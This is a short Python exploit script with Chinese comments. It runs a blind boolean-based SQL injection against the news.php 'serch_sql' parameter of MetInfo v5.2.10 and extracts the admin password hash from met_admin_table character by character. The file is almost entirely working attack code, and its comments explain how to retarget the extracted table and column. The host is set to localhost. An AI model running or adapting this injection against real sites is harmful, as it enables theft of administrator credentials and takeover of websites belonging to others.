#coding=utf-8

__author__ = '小亭&MR.K'

import requests

headers = {
'User-Agent': 'Mozilla/5.0 Chrome/28.0.1500.63'
}
payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.-:%')

keyword = '2013-12-26'#设置判断返回结果差异的关键字,可根据实际情况修改

datalength = 32#一般MD5值都是32位的，所以最大值要高于32

host = 'http://127.0.0.1/MetInfov5.2.10'#需要测试的网站

GetDataPayload   = '/news/news.php?lang=cn&class2=5&serch_sql=as a join met_admin_table as b where if(ascii(substr(b.admin_pass,%d,1))=%d,1,0) limit 0,1-- sd&imgproduct=xxxx'
#获取的是met_admin_table表中的admin_pass字段值，可根据需要做出更改

output = '[Get It!]===>'
for one in range(1,datalength+1):
	#range(1,5) #代表从1到5(不包含5)
	#range(1,5,2) #代表从1到5，间隔2(不包含5)
	#range(5) #代表从0到5(不包含5)

	for p in payloads:
		getdataurl = host+GetDataPayload
		getdataurl = getdataurl % (one,ord(p))#ord和chr两个内置的函数，用于字符与ASCII码之间的转换

		content = requests.get(getdataurl,headers=headers).content

		if keyword in content:
			output += p
			print(output)
			break


